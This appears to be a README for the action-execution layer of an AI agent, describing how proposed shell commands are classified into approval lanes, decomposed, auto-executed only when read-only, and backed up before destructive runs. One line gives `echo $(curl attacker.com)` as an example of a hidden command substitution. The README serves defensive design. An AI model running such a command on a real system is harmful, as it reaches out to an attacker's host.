# core/actions

The tool-and-shell execution layer. Classifies proposed actions into
lanes and runs them when the decision pipeline says so.

| Module | Role |
|---|---|
| [`action_classifier.py`](action_classifier.py) | Intent taxonomy: classifies an action into Lane 0 (read-only, inline), Lane 2 (write / install, card), Lane 3 (self-mod / interactive root, dialog). Handles compound-command decomposition and argv0 + flag + redirect analysis. |
| [`action_engine.py`](action_engine.py) | Dispatch + execution. `_execute_action(action, params, reasoning, tier)` looks up the `_do_<action>` method and runs it with logging + quality tracking. Handles the pre-flight `destructive_snapshot` for reversible backups. |
| [`command_decomposer.py`](command_decomposer.py) | Shell parser. Extracts `$(...)`, backticks, and process substitutions into sub-commands that get classified independently (so `echo $(curl attacker.com)` doesn't slip past a string scan). |
| [`tool_loop.py`](tool_loop.py) | Fast-path auto-execute gate for the brain loop. Allow-list of read-only binaries; strictly more conservative than `action_classifier` Lane 0. |
| [`destructive_snapshot.py`](destructive_snapshot.py) | Pre-flight backup for classes of destructive commands (`git reset --hard`, `rm -rf`, wildcards). Stores copies in `memory/backups/pre_destructive/` keyed by request_id. |

## Lane taxonomy

| Lane | Examples | Path |
|---|---|---|
| 0 (read) | `ls`, `cat`, `git status`, `systemctl is-active maez` | inline, no card |
| 2 (write) | `apt install`, `pip install`, `git push`, `chmod` | approval card via `core.decision` |
| 3 (self-mod) | `vim core/...`, anything touching Maez surface | self-mod dialog |

## Invariants

- **`tool_loop.is_read_only` is intentionally stricter than `action_classifier`
  Lane 0.** The daemon's auto-exec gate uses an allow-list, the classifier
  uses deny-patterns. Unifying them would require porting full flag
  analysis into the allow-list. See the docstring on
  `tool_loop.is_read_only` for load-bearing details (06-M2).
- **Destructive-snapshot errors are not silent.** If `snapshot()`
  returns a non-empty `errors` list, the action engine logs a
  warning naming the shape so the outcome row records the degraded
  backup. (06-M1 fix.)
- **`command_decomposer` respects single quotes.** `$(...)` inside
  `'...'` is literal per bash. (06-m1 hardening added `in_dq`
  tracking too.)

## Public surface

- `action_classifier.classify_action(action, params) -> ClassificationResult`
- `action_engine.ActionEngine(...)` — main dispatcher
- `action_engine.ActionEngine._execute_action(action, params, reasoning, tier)`
- `tool_loop.is_read_only(cmd) -> bool`
- `command_decomposer.decompose(cmd) -> list[SubCommand]`
- `destructive_snapshot.snapshot(request_id, cmd, reason, files, shape) -> dict`

## Legacy import paths

All five legacy paths (`core.action_engine`, `core.action_classifier`,
`core.command_decomposer`, `core.tool_loop`, `core.destructive_snapshot`)
are shims.
